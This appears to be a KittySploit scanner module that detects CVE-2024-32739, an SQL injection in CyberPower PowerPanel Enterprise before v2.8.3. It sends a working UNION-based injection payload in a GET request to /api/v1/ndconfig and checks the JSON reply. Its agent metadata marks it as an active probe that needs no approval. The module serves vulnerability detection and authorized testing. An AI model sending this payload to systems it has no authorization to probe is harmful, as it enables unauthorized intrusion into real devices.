#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A sql injection vulnerability exists in CyberPower PowerPanel Enterprise prior to v2."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CyberPower < v2.8.3 - SQL Injection Detection',
        'description': 'A sql injection vulnerability exists in CyberPower PowerPanel Enterprise prior to v2.8.3.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'cyberpower', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.cyberpower.com/global/en/File/GetFileSampleByType?fileId=SU-18070002-07&fileSubType=FileReleaseNote',
            'https://www.tenable.com/security/research/tra-2024-14',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-32739',
        ],
        'cve': 'CVE-2024-32739',
    }

    def run(self):
        path = "/api/v1/ndconfig?mode=&uid=1'%20UNION%20select%201,2,3,sqlite_version();--"
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        body_all = (':"finished"', '"results":',)
        ctype_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
            self.set_info(
                severity='high',
                reason='CyberPower < v2.8.3 - SQL Injection detected',
                path=path,
            )
            return True
        return False

